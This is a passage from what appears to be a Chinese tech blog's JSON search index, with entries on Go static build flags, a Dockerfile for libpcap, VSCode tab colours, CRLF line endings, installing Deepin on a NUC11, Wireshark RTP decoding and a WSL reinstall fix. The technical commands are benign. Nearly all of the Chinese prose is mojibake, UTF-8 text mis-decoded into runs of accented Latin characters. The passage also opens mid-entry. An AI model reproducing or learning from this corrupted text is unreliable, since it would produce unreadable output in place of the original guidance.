å‘½ä»¤åŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n-aï¼šå¼ºåˆ¶é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„åŒ…ï¼Œå³ä½¿å®ƒä»¬å·²ç»æ˜¯æœ€æ–°çš„ã€‚è¿™ä¸ªé€‰é¡¹é€šå¸¸ç”¨äºå¼ºåˆ¶æ›´æ–°ä¾èµ–åŒ…æˆ–è€…é‡å»ºæ•´ä¸ªç¨‹åºã€‚ --ldflagsï¼šè®¾ç½®é“¾æ¥å™¨é€‰é¡¹ï¼Œè¿™ä¸ªé€‰é¡¹åé¢çš„å‚æ•°ä¼šè¢«ä¼ é€’ç»™é“¾æ¥å™¨ã€‚ -linkmode externalï¼šæŒ‡å®šé“¾æ¥æ¨¡å¼ä¸º externalï¼Œå³ä½¿ç”¨å¤–éƒ¨é“¾æ¥å™¨ã€‚ -extldflags \u0026quot;-static -s -w\u0026quot;ï¼šä¼ é€’ç»™å¤–éƒ¨é“¾æ¥å™¨çš„é€‰é¡¹ï¼Œå…¶ä¸­åŒ…å«äº† -staticï¼ˆå¼ºåˆ¶ä½¿ç”¨é™æ€é“¾æ¥ï¼‰ã€-sï¼ˆç¦æ­¢ç¬¦å·è¡¨å’Œè°ƒè¯•ä¿¡æ¯ç”Ÿæˆï¼‰å’Œ -wï¼ˆç¦æ­¢ DWARF è°ƒè¯•ä¿¡æ¯ç”Ÿæˆï¼‰ä¸‰ä¸ªé€‰é¡¹ã€‚ è¿™ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯ç”Ÿæˆä¸€ä¸ªé™æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶ä¸­æ‰€æœ‰çš„ä¾èµ–åŒ…éƒ½è¢«é“¾æ¥è¿›äº†æœ€ç»ˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œè¿™æ ·å¯ä»¥ä¿è¯å¯æ‰§è¡Œæ–‡ä»¶çš„å¯ç§»æ¤æ€§å’Œå…¼å®¹æ€§ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‡å°æ–‡ä»¶å¤§å°ã€‚è¿™ä¸ªå‘½ä»¤çš„ç¼ºç‚¹æ˜¯ç¼–è¯‘æ—¶é—´è¾ƒé•¿ï¼Œç‰¹åˆ«æ˜¯åœ¨åŒ…æ•°é‡è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œå› ä¸ºå®ƒéœ€è¦é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„åŒ…ï¼Œå³ä½¿å®ƒä»¬å·²ç»æ˜¯æœ€æ–°çš„ã€‚\n","permalink":"https://wdd.js.org/golang/build-docker-image-with-libpcap/","summary":"å¸¸è§„æ„å»º ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„Dockerfileå¯èƒ½æ˜¯ä¸‹é¢è¿™æ ·çš„\nè¿™ä¸ªDockerfileä½¿ç”¨äº†å¤šæ­¥æ„å»ºï¼Œä½¿ç”¨golang:1.19.4ä½œä¸ºæ„å»ºå®¹å™¨ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ„å»ºæˆåŠŸåï¼Œå•ç‹¬æŠŠæ–‡ä»¶å¤åˆ¶åˆ°alpineé•œåƒã€‚ è¿™æ ·åšçš„å¥½å¤„æ˜¯æœ€åäº§å‡ºçš„é•œåƒéå¸¸å°ï¼Œä¸€èˆ¬åªæœ‰åå‡ MBçš„æ ·å­ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨golangçš„é•œåƒæ¥æ„å»ºï¼Œé•œåƒä½“ç§¯å°±å¯èƒ½è¾¾åˆ°1Gå·¦å³ã€‚ FROM golang:1.19.4 as builder ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct WORKDIR /app COPY . . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o run . FROM alpine:3.14.2 WORKDIR /app COPY encdec run.sh /app/ COPY --from=builder /app/run . EXPOSE 3000 ENTRYPOINT [\u0026#34;/app/run\u0026#34;] ä¾èµ–libpcapçš„æ„å»º å¦‚æœä½¿ç”¨äº†ç¨‹åºä½¿ç”¨äº†libpcap æ¥æŠ“åŒ…ï¼Œé‚£ä¹ˆé™¤äº†æˆ‘ä»¬è‡ªå·±ä»£ç äº§ç”Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤–ï¼Œå¯èƒ½è¿˜ä¼šä¾èµ–libpcapçš„æ–‡ä»¶ã€‚å¸¸è§„æ‰“åŒ…å°±ä¼šæŠ¥å„ç§é”™è¯¯ï¼Œä¾‹å¦‚æ–‡ä»¶æ‰¾ä¸åˆ°ï¼Œç¼ºå°‘soæ–‡ä»¶ç­‰ç­‰ã€‚\nlibpcapæ˜¯ä¸€ä¸ªcåº“ï¼Œå¹¶ä¸æ˜¯golangçš„ä»£ç ï¼Œæ‰€ä»¥å¤„ç†èµ·æ¥è¦ä¸ä¸€æ ·ã€‚\nä¸‹é¢ç›´æ¥ç»™å‡ºDockerfile\n# æ„å»ºçš„åŸºç¡€é•œåƒæ¢æˆäº†alpineé•œåƒ FROM golang:alpine as builder # å°†alpineé•œåƒæ¢æ¸…åæºï¼Œè¿™æ ·åç»­ä¾èµ–çš„å®‰è£…ä¼šåŠ å¿« RUN sed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g\u0026#39; /etc/apk/repositories # å®‰è£…éœ€è¦ç”¨åˆ°çš„Cåº“ï¼Œå’Œæ„å»ºä¾èµ– RUN apk --update add linux-headers musl-dev gcc libpcap-dev # ä½¿ç”¨å›½å†…çš„goproxy ENV GO111MODULE=on GOPROXY=https://goproxy.","title":"Build Docker Image With Libpcap"},{"content":"é»˜è®¤æƒ…å†µä¸‹VScodeçš„tabæ ï¼Œå½“å‰çš„é¢œè‰²ä¼šæ›´æ·±ä¸€ç‚¹ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯æ¿€æ´»çš„ã€‚\nä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰å¤ªé«˜çš„åŒºåˆ†åº¦ï¼Œç‰¹åˆ«æ˜¯å½“æ˜¾ç¤ºå±æœ‰ç‚¹åå…‰çš„æ—¶å€™ã€‚\næˆ‘æƒ³åº”è¯¥ä¸æ­¢ä¸€ä¸ªäººæœ‰è¿™ä¸ªé—®é¢˜å§\nçœ‹äº†githubä¸Šï¼Œæœ‰ä¸ªäººåé¦ˆäº†è¿™ä¸ªé—®é¢˜ï¼Œhttps://github.com/Microsoft/vscode/issues/24586\nåé¢æœ‰äººå›å¤äº†\n\u0026#34;workbench.colorCustomizations\u0026#34;: { \u0026#34;tab.activeBorder\u0026#34;: \u0026#34;#ff0000\u0026#34;, \u0026#34;tab.unfocusedActiveBorder\u0026#34;: \u0026#34;#000000\u0026#34; } ä¸Šé¢å°±æ˜¯ç”¨æ¥é…ç½®Tabè¾¹ç•Œçš„é¢œè‰²çš„ã€‚\nçœ‹ä¸‹æ•ˆæœï¼Œå½“å‰æ¿€æ´»çš„Tabä¸‹æœ‰æ˜æ˜¾çš„çº¢çº¿ï¼Œæ˜¯ä¸æ˜¯æ›´å®¹æ˜“åŒºåˆ†äº†å‘¢\n","permalink":"https://wdd.js.org/posts/2023/vscode-highlight-tab/","summary":"é»˜è®¤æƒ…å†µä¸‹VScodeçš„tabæ ï¼Œå½“å‰çš„é¢œè‰²ä¼šæ›´æ·±ä¸€ç‚¹ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯æ¿€æ´»çš„ã€‚\nä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰å¤ªé«˜çš„åŒºåˆ†åº¦ï¼Œç‰¹åˆ«æ˜¯å½“æ˜¾ç¤ºå±æœ‰ç‚¹åå…‰çš„æ—¶å€™ã€‚\næˆ‘æƒ³åº”è¯¥ä¸æ­¢ä¸€ä¸ªäººæœ‰è¿™ä¸ªé—®é¢˜å§\nçœ‹äº†githubä¸Šï¼Œæœ‰ä¸ªäººåé¦ˆäº†è¿™ä¸ªé—®é¢˜ï¼Œhttps://github.com/Microsoft/vscode/issues/24586\nåé¢æœ‰äººå›å¤äº†\n\u0026#34;workbench.colorCustomizations\u0026#34;: { \u0026#34;tab.activeBorder\u0026#34;: \u0026#34;#ff0000\u0026#34;, \u0026#34;tab.unfocusedActiveBorder\u0026#34;: \u0026#34;#000000\u0026#34; } ä¸Šé¢å°±æ˜¯ç”¨æ¥é…ç½®Tabè¾¹ç•Œçš„é¢œè‰²çš„ã€‚\nçœ‹ä¸‹æ•ˆæœï¼Œå½“å‰æ¿€æ´»çš„Tabä¸‹æœ‰æ˜æ˜¾çš„çº¢çº¿ï¼Œæ˜¯ä¸æ˜¯æ›´å®¹æ˜“åŒºåˆ†äº†å‘¢","title":"VScodeæ¿€æ´»Tabæ›´å®¹æ˜“åŒºåˆ†"},{"content":"CRLF äºŒè¿›åˆ¶ åè¿›åˆ¶ åå…­è¿›åˆ¶ å…«è¿›åˆ¶ å­—ç¬¦/ç¼©å†™ è§£é‡Š 00001010 10 0A 012 LF/NL(Line Feed/New Line) æ¢è¡Œé”® 00001101 13 0D 085 CR (Carriage Return) å›è½¦é”® CRä»£è¡¨å›è½¦ç¬¦ï¼ŒLFä»£è¡¨æ¢è¡Œç¬¦ã€‚\nè¿™ä¸¤ä¸ªç¬¦å·æœ¬èº«éƒ½æ˜¯ä¸å¯è§çš„ã€‚\nå¦‚æœæ‰“å°å‡ºæ¥\nCR ä¼šæ˜¾ç¤º \\r LF ä¼šæ˜¾ç¤º \\n ä¸åŒç³»ç»Ÿçš„è¡Œç»“æŸç¬¦ Linuxç³»ç»Ÿå’ŒMacæ¢è¡Œç¬¦æ˜¯ \\n Windowsç³»ç»Ÿçš„æ¢è¡Œç¬¦æ˜¯ \\r\\n å¦‚ä½•åŒºåˆ†æ–‡ä»¶çš„æ¢è¡Œç¬¦ï¼Ÿ å¯ä»¥ä½¿ç”¨odå‘½ä»¤\nod -bc index.md å‡å¦‚æ–‡ä»¶çš„åŸå§‹å†…å®¹å¦‚ä¸‹\n- 1 - 2 æ³¨æ„012æ˜¯å…«è¿›åˆ¶çš„æ•°ï¼Œåè¿›åˆ¶å¯¹åº”çš„æ•°å­—æ˜¯10ï¼Œä¹Ÿå°±æ˜¯æ¢è¡Œç¬¦ã€‚\n0000000 055 040 061 012 055 040 062 - 1 \\n - 2 0000007 å¦‚æœç”¨vscodeæ‰“å¼€æ–‡ä»¶ï¼Œä¹Ÿèƒ½çœ‹åˆ°å¯¹åº”çš„æ–‡ä»¶æ ¼å¼ï¼Œå¦‚LFã€‚\næ¢è¡Œç¬¦çš„çš„å·®å¼‚ä¼šå¯¼è‡´å“ªäº›é—®é¢˜ï¼Ÿ shellè„šæœ¬é—®é¢˜ å¦‚æœbashè„šæœ¬é‡ŒåŒ…å«CRLF, å¯èƒ½å¯¼è‡´è„šæœ¬æ— æ³•è§£æç­‰å„ç§å¼‚å¸¸é—®é¢˜ã€‚\nä¾‹å¦‚ä¸‹é¢çš„æŠ¥é”™ï¼Œdockerå¯åŠ¨shellè„šæœ¬å¯èƒ½æ˜¯åœ¨windowsä¸‹ç¼–å†™çš„ã€‚æ‰€ä»¥è„šæœ¬æ— æ³•\nstandard_init_linux.go:211: exec user process caused \u0026#34;no such file or directory\u0026#34; å¦‚ä½•æŠŠwindowsæ–‡ä»¶ç±»å‹è½¬ä¸ºunix? # å¯ä»¥æŠŠwindowsæ–‡ä»¶ç±»å‹è½¬ä¸ºunix dos2unix file å¦‚æœæ˜¯vscodeï¼Œä¹Ÿå¯ä»¥ç‚¹å‡»å¯¹åº”çš„æ–‡ä»¶æ ¼å¼æŒ‰é’®ã€‚\nå¦‚ä½•è§£å†³è¿™äº›é—®é¢˜ï¼Ÿ æœ€å¥½çš„æ–¹æ¡ˆï¼Œæ˜¯æˆ‘ä»¬æŠŠä»£ç ç¼–è¾‘å™¨ï¼Œ è®¾ç½®eolä¸º\\nï¼Œ ä»æºå¤´è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\nä»¥vscodeä¸ºä¾‹å­ï¼š\nTip vscodeçš„eolé…ç½®ï¼Œåªå¯¹æ–°æ–‡ä»¶ç”Ÿæ•ˆ å¦‚æœæ–‡ä»¶æœ¬æ¥å°±æ˜¯CRLFï¼Œ éœ€è¦å…ˆè½¬æˆLF, eolæ‰ä¼šç”Ÿæ•ˆ ","permalink":"https://wdd.js.org/posts/2023/tips-about-cr-lf/","summary":"CRLF äºŒè¿›åˆ¶ åè¿›åˆ¶ åå…­è¿›åˆ¶ å…«è¿›åˆ¶ å­—ç¬¦/ç¼©å†™ è§£é‡Š 00001010 10 0A 012 LF/NL(Line Feed/New Line) æ¢è¡Œé”® 00001101 13 0D 085 CR (Carriage Return) å›è½¦é”® CRä»£è¡¨å›è½¦ç¬¦ï¼ŒLFä»£è¡¨æ¢è¡Œç¬¦ã€‚\nè¿™ä¸¤ä¸ªç¬¦å·æœ¬èº«éƒ½æ˜¯ä¸å¯è§çš„ã€‚\nå¦‚æœæ‰“å°å‡ºæ¥\nCR ä¼šæ˜¾ç¤º \\r LF ä¼šæ˜¾ç¤º \\n ä¸åŒç³»ç»Ÿçš„è¡Œç»“æŸç¬¦ Linuxç³»ç»Ÿå’ŒMacæ¢è¡Œç¬¦æ˜¯ \\n Windowsç³»ç»Ÿçš„æ¢è¡Œç¬¦æ˜¯ \\r\\n å¦‚ä½•åŒºåˆ†æ–‡ä»¶çš„æ¢è¡Œç¬¦ï¼Ÿ å¯ä»¥ä½¿ç”¨odå‘½ä»¤\nod -bc index.md å‡å¦‚æ–‡ä»¶çš„åŸå§‹å†…å®¹å¦‚ä¸‹\n- 1 - 2 æ³¨æ„012æ˜¯å…«è¿›åˆ¶çš„æ•°ï¼Œåè¿›åˆ¶å¯¹åº”çš„æ•°å­—æ˜¯10ï¼Œä¹Ÿå°±æ˜¯æ¢è¡Œç¬¦ã€‚\n0000000 055 040 061 012 055 040 062 - 1 \\n - 2 0000007 å¦‚æœç”¨vscodeæ‰“å¼€æ–‡ä»¶ï¼Œä¹Ÿèƒ½çœ‹åˆ°å¯¹åº”çš„æ–‡ä»¶æ ¼å¼ï¼Œå¦‚LFã€‚\næ¢è¡Œç¬¦çš„çš„å·®å¼‚ä¼šå¯¼è‡´å“ªäº›é—®é¢˜ï¼Ÿ shellè„šæœ¬é—®é¢˜ å¦‚æœbashè„šæœ¬é‡ŒåŒ…å«CRLF, å¯èƒ½å¯¼è‡´è„šæœ¬æ— æ³•è§£æç­‰å„ç§å¼‚å¸¸é—®é¢˜ã€‚\nä¾‹å¦‚ä¸‹é¢çš„æŠ¥é”™ï¼Œdockerå¯åŠ¨shellè„šæœ¬å¯èƒ½æ˜¯åœ¨windowsä¸‹ç¼–å†™çš„ã€‚æ‰€ä»¥è„šæœ¬æ— æ³•\nstandard_init_linux.go:211: exec user process caused \u0026#34;no such file or directory\u0026#34; å¦‚ä½•æŠŠwindowsæ–‡ä»¶ç±»å‹è½¬ä¸ºunix?","title":"è¡Œä½ç»“æŸç¬¦å¼•èµ·çš„é—®é¢˜"},{"content":"ç¡¬ä»¶ å†…å­˜ï¼šé‡‘å£«é¡¿ 16*2ï¼›869å…ƒ å›ºæ€ç¡¬ç›˜ï¼š ä¸‰æ˜Ÿ980 1TB; 799å…ƒ ä¸»æœºï¼šNUC11 PAHI7; 4æ ¸å¿ƒå…«çº¿ç¨‹ï¼›3399å…ƒ ç´¯è®¡5000å¤šä¸€ç‚¹, æ˜¯æœ€æ–°ç‰ˆMacbook pro M1prodçš„ä¸‰åˆ†ä¹‹ä¸€\nå¯åŠ¨ç›˜åˆ¶ä½œ ventoyï¼šè¯•äº†å‡ æ¬¡ï¼Œæ— æ³•å¼€æœºï¼Œé‚æ”¾å¼ƒ rufusï¼šèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼›æ³¨æ„åˆ†åŒºç±»å‹è¦é€‰æ‹©GPTã€‚æœ€æ–°æ¬¾çš„ä¸€äº›ç”µè„‘éƒ½æ˜¯æ”¯æŒuefiçš„ï¼Œæ‰€ä»¥é€‰æ‹©GPTåˆ†åŒºï¼Œä¸€å®šæ²¡é—®é¢˜ã€‚\nUç›˜å¯åŠ¨ å¼€æœºåæŒ‰F2, é‡Œé¢æœ‰ä¸€ä¸ªæ˜¯è®¾ç½®BIOSä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¾ç½®ä¼˜å…ˆUç›˜å¯åŠ¨\nç£ç›˜åˆ†åŒº å› ä¸ºä¹‹å‰è®¾ç½®äº†é»˜è®¤çš„æ•´ä¸ªç£ç›˜åˆ†åŒºï¼Œæ ¹ç›®å½•åªæœ‰15G, å¤ªå°äº†ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ‰‹åŠ¨åˆ†åŒº å…ˆè®¾ç½®ä¸€ä¸ªefiåˆ†åŒºï¼Œå°±ç”¨é»˜è®¤çš„300Må°±å¯ä»¥ï¼Œé»˜è®¤å¼¹çª—å‡ºæ¥ï¼Œæ˜¯ä¸éœ€è¦è®¾ç½®æŒ‚åœ¨ç›®å½•çš„ è®¾ç½®æ ¹åˆ†åŒº /, æˆ‘åˆ†äº†300G è®¾ç½®/homeåˆ†åŒºï¼Œå‰©ä¸‹çš„ç£ç›˜éƒ½åˆ†ç»™ä»– æˆ‘æ²¡æœ‰è®¾ç½®swapåˆ†åŒºï¼Œå› ä¸ºæˆ‘è§‰å¾—32Gå†…å­˜å¤Ÿå¤§ï¼Œä¸éœ€è¦swap\nå…¶ä»– åç»­çš„é…ç½®éå¸¸ç®€å•ï¼ŒåŸºæœ¬ç‚¹ç‚¹æŒ‰é’®å°±èƒ½æå®š\nä½“éªŒ æ€»ä½“æ¥è¯´ï¼Œå®‰è£…è½¯ä»¶æ˜¯æœ€èˆ’æœçš„ä¸€ä»¶äº‹ã€‚ä¸éœ€è¦åƒå®‰è£…manjaroé‚£æ ·ï¼Œåˆ°å¤„æ‰¾å®‰è£…å¸¸ç”¨åº”ç”¨çš„æ•™ç¨‹ã€‚åªéœ€è¦æ‰“å¼€åº”ç”¨å•†åº—ï¼Œç‚¹å‡»ä¸‹è½½å°±å¯ä»¥äº†ã€‚ æ•´ä¸ªå®‰è£…è¿‡ç¨‹ï¼Œæˆ‘è§‰å¾—ç£ç›˜åˆ†åŒºæ˜¯æœ€éš¾çš„éƒ¨åˆ†ã€‚å…¶ä»–éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚ æ„Ÿè§‰æ·±åº¦çš„ç•Œé¢å¾ˆæ¼‚äº®ï¼Œå€¼å¾—ä½“éªŒ\né—®é¢˜ NUCè‡ªå¸¦çš„éº¦å…‹é£æ— æ³•å¤–æ”¾å£°éŸ³ï¼Œæ’æœ‰çº¿è€³æœºä¹Ÿä¸è¡Œï¼Œåªæœ‰è“ç‰™è€³æœºèƒ½ç”¨ ","permalink":"https://wdd.js.org/posts/2022/12/nuc11-deepin-20-2/","summary":"ç¡¬ä»¶ å†…å­˜ï¼šé‡‘å£«é¡¿ 16*2ï¼›869å…ƒ å›ºæ€ç¡¬ç›˜ï¼š ä¸‰æ˜Ÿ980 1TB; 799å…ƒ ä¸»æœºï¼šNUC11 PAHI7; 4æ ¸å¿ƒå…«çº¿ç¨‹ï¼›3399å…ƒ ç´¯è®¡5000å¤šä¸€ç‚¹, æ˜¯æœ€æ–°ç‰ˆMacbook pro M1prodçš„ä¸‰åˆ†ä¹‹ä¸€\nå¯åŠ¨ç›˜åˆ¶ä½œ ventoyï¼šè¯•äº†å‡ æ¬¡ï¼Œæ— æ³•å¼€æœºï¼Œé‚æ”¾å¼ƒ rufusï¼šèƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼›æ³¨æ„åˆ†åŒºç±»å‹è¦é€‰æ‹©GPTã€‚æœ€æ–°æ¬¾çš„ä¸€äº›ç”µè„‘éƒ½æ˜¯æ”¯æŒuefiçš„ï¼Œæ‰€ä»¥é€‰æ‹©GPTåˆ†åŒºï¼Œä¸€å®šæ²¡é—®é¢˜ã€‚\nUç›˜å¯åŠ¨ å¼€æœºåæŒ‰F2, é‡Œé¢æœ‰ä¸€ä¸ªæ˜¯è®¾ç½®BIOSä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¾ç½®ä¼˜å…ˆUç›˜å¯åŠ¨\nç£ç›˜åˆ†åŒº å› ä¸ºä¹‹å‰è®¾ç½®äº†é»˜è®¤çš„æ•´ä¸ªç£ç›˜åˆ†åŒºï¼Œæ ¹ç›®å½•åªæœ‰15G, å¤ªå°äº†ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ‰‹åŠ¨åˆ†åŒº å…ˆè®¾ç½®ä¸€ä¸ªefiåˆ†åŒºï¼Œå°±ç”¨é»˜è®¤çš„300Må°±å¯ä»¥ï¼Œé»˜è®¤å¼¹çª—å‡ºæ¥ï¼Œæ˜¯ä¸éœ€è¦è®¾ç½®æŒ‚åœ¨ç›®å½•çš„ è®¾ç½®æ ¹åˆ†åŒº /, æˆ‘åˆ†äº†300G è®¾ç½®/homeåˆ†åŒºï¼Œå‰©ä¸‹çš„ç£ç›˜éƒ½åˆ†ç»™ä»– æˆ‘æ²¡æœ‰è®¾ç½®swapåˆ†åŒºï¼Œå› ä¸ºæˆ‘è§‰å¾—32Gå†…å­˜å¤Ÿå¤§ï¼Œä¸éœ€è¦swap\nå…¶ä»– åç»­çš„é…ç½®éå¸¸ç®€å•ï¼ŒåŸºæœ¬ç‚¹ç‚¹æŒ‰é’®å°±èƒ½æå®š\nä½“éªŒ æ€»ä½“æ¥è¯´ï¼Œå®‰è£…è½¯ä»¶æ˜¯æœ€èˆ’æœçš„ä¸€ä»¶äº‹ã€‚ä¸éœ€è¦åƒå®‰è£…manjaroé‚£æ ·ï¼Œåˆ°å¤„æ‰¾å®‰è£…å¸¸ç”¨åº”ç”¨çš„æ•™ç¨‹ã€‚åªéœ€è¦æ‰“å¼€åº”ç”¨å•†åº—ï¼Œç‚¹å‡»ä¸‹è½½å°±å¯ä»¥äº†ã€‚ æ•´ä¸ªå®‰è£…è¿‡ç¨‹ï¼Œæˆ‘è§‰å¾—ç£ç›˜åˆ†åŒºæ˜¯æœ€éš¾çš„éƒ¨åˆ†ã€‚å…¶ä»–éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚ æ„Ÿè§‰æ·±åº¦çš„ç•Œé¢å¾ˆæ¼‚äº®ï¼Œå€¼å¾—ä½“éªŒ\né—®é¢˜ NUCè‡ªå¸¦çš„éº¦å…‹é£æ— æ³•å¤–æ”¾å£°éŸ³ï¼Œæ’æœ‰çº¿è€³æœºä¹Ÿä¸è¡Œï¼Œåªæœ‰è“ç‰™è€³æœºèƒ½ç”¨ ","title":"NUC11 å®‰è£… Deepin 20.2.4"},{"content":"0. å‰ææ¡ä»¶ wireshark 4.0.2 1. æ—¶é—´æ˜¾ç¤º wiresharkçš„é»˜è®¤æ—¶é—´æ˜¾ç¤ºæ˜¯æŠ“åŒ…çš„ç›¸å¯¹æ—¶é—´ï¼Œ å¦‚æœæˆ‘ä»¬æ—¶é—´æŒ‰ç…§å¹´æœˆæ—¥æ—¶åˆ†ç§’æ˜¾ç¤ºï¼Œå°±éœ€è¦è¿›è¡Œå¦‚ä¸‹è®¾ç½®:\nè§†å›¾-\u0026gt;æ—¶é—´æ˜¾ç¤ºæ ¼å¼-\u0026gt;é€‰æ‹©å…·ä½“çš„æ—¶é—´æ ¼å¼\n2. UDPè§£ç ä¸ºRTP æ–¹æ¡ˆ1 åœ¨ä¸€ä¸ªåŒ…UDPåŒ…ä¸Šç‚¹å‡»å³é”®ï¼Œå‡ºç°å¦‚ä¸‹å¼¹æ¡†ï¼Œé€‰æ‹©Decode As\nå†å½“å‰å€¼ä¸Šé€‰æ‹©RTP æ–¹æ¡ˆ2 æ–¹æ¡ˆ1æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œåªèƒ½è¿‡æ»¤å•ä¸€ç«¯å£çš„UDPåŒ…ï¼Œå°†å…¶è§£ç ä¸ºRTPã€‚\nå‡å¦‚æœ‰å¾ˆå¤šçš„UDPåŒ…ï¼Œå¹¶ä¸”ç«¯å£éƒ½ä¸ä¸€æ ·ï¼Œå¦‚æœæƒ³æŠŠè¿™äº›åŒ…éƒ½è§£ç ä¸ºRTP, åˆ™éœ€è¦å¦‚ä¸‹è®¾ç½®ã€‚\né€‰æ‹©åˆ†æ-\u0026gt;å¯ç”¨çš„åè®®\nåœ¨æœç´¢æ¡†ä¸­è¾“å…¥RTP, ç„¶åå¯ç”¨RTPçš„rtp_udp\n","permalink":"https://wdd.js.org/posts/2022/12/wireshark-101/","summary":"0. å‰ææ¡ä»¶ wireshark 4.0.2 1. æ—¶é—´æ˜¾ç¤º wiresharkçš„é»˜è®¤æ—¶é—´æ˜¾ç¤ºæ˜¯æŠ“åŒ…çš„ç›¸å¯¹æ—¶é—´ï¼Œ å¦‚æœæˆ‘ä»¬æ—¶é—´æŒ‰ç…§å¹´æœˆæ—¥æ—¶åˆ†ç§’æ˜¾ç¤ºï¼Œå°±éœ€è¦è¿›è¡Œå¦‚ä¸‹è®¾ç½®:\nè§†å›¾-\u0026gt;æ—¶é—´æ˜¾ç¤ºæ ¼å¼-\u0026gt;é€‰æ‹©å…·ä½“çš„æ—¶é—´æ ¼å¼\n2. UDPè§£ç ä¸ºRTP æ–¹æ¡ˆ1 åœ¨ä¸€ä¸ªåŒ…UDPåŒ…ä¸Šç‚¹å‡»å³é”®ï¼Œå‡ºç°å¦‚ä¸‹å¼¹æ¡†ï¼Œé€‰æ‹©Decode As\nå†å½“å‰å€¼ä¸Šé€‰æ‹©RTP æ–¹æ¡ˆ2 æ–¹æ¡ˆ1æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œåªèƒ½è¿‡æ»¤å•ä¸€ç«¯å£çš„UDPåŒ…ï¼Œå°†å…¶è§£ç ä¸ºRTPã€‚\nå‡å¦‚æœ‰å¾ˆå¤šçš„UDPåŒ…ï¼Œå¹¶ä¸”ç«¯å£éƒ½ä¸ä¸€æ ·ï¼Œå¦‚æœæƒ³æŠŠè¿™äº›åŒ…éƒ½è§£ç ä¸ºRTP, åˆ™éœ€è¦å¦‚ä¸‹è®¾ç½®ã€‚\né€‰æ‹©åˆ†æ-\u0026gt;å¯ç”¨çš„åè®®\nåœ¨æœç´¢æ¡†ä¸­è¾“å…¥RTP, ç„¶åå¯ç”¨RTPçš„rtp_udp","title":"Wireshark ä½¿ç”¨æŠ€å·§"},{"content":"æœ€è¿‘æˆ‘æ›´æ–°äº†Windows, ä¹‹åæˆ‘çš„Windows Linuxå­ç³»ç»ŸUbuntuæ‰“å¼€å°±æŠ¥é”™äº†\næŠ¥é”™æˆªå›¾å¦‚ä¸‹ï¼š\nåœ¨ç½‘ä¸Šæœäº†ä¸€è¾¹ä¹‹åï¼Œå¾ˆå¤šæ•™ç¨‹éƒ½æ˜¯è¯´è¦æ‰“å¼€Windowsçš„å­ç³»ç»Ÿçš„åŠŸèƒ½ã€‚ ä½†æ˜¯ç”±äºæˆ‘å·²ç»ä½¿ç”¨Linuxå­ç³»ç»Ÿå·²ç»å¾ˆé•¿æ—¶é—´äº†ï¼Œæˆ‘è§‰å¾—åº”è¯¥å’Œè¿™ä¸ªè®¾ç½®æ— å…³ã€‚\nè€Œä¸”æˆ‘æ£€æŸ¥äº†ä¸€ä¸‹ï¼Œæˆ‘çš„è¿™ä¸ªè®¾ç½®æœ¬æ¥å°±æ˜¯æ‰“å¼€çš„ã€‚\nç„¶åæˆ‘åœ¨Powershellé‡Œè¾“å…¥ wslï¼Œ è¿™ä¸ªå‘½ä»¤éƒ½ç›´æ¥æŠ¥é”™äº†ã€‚\nPS C:\\WINDOWS\\system32\u0026gt; wsl --install æ²¡æœ‰æ³¨å†Œç±» Error code: Wsl/0x80040154 ç„¶åæˆ‘åˆ°wslçš„githubä¸Šæœç´¢ç±»ä¼¼çš„é—®é¢˜ï¼ŒæŸ¥åˆ°æœ‰å¾ˆå¤šç±»ä¼¼çš„æè¿°ï¼Œéƒ½æ˜¯å‡çº§ä¹‹åé‡åˆ°çš„é—®é¢˜ï¼Œæˆ‘è¯•äº†å¥½å‡ ä¸ªæ–¹å¼ï¼Œéƒ½æ²¡ç”¨ã€‚\nä½†æ˜¯æœ€åè¿™ä¸ªæœ‰ç”¨äº†ï¼\nhttps://github.com/microsoft/WSL/issues/9064\nè§£å†³çš„æ–¹æ¡ˆå°±æ˜¯ï¼š\nå¸è½½å·²ç»å®‰è£…è¿‡çš„Windows SubSystem For Linux Preview ç„¶åå†Windowsåº”ç”¨å•†åº—é‡æ–°å®‰è£…è¿™ä¸ªåº”ç”¨ Windowsçš„å‡çº§ä¹‹åï¼Œå¯èƒ½Windows Linuxå­ç³»ç»Ÿç»„å»ºä¹Ÿæ›´æ–°äº†æŸäº›äº†å†…å®¹ã€‚\næ‰€ä»¥éœ€è¦é‡è£…ã€‚\nè¿™é‡Œä¸å¾—ä¸åæ§½ä¸€ä¸‹WSL, 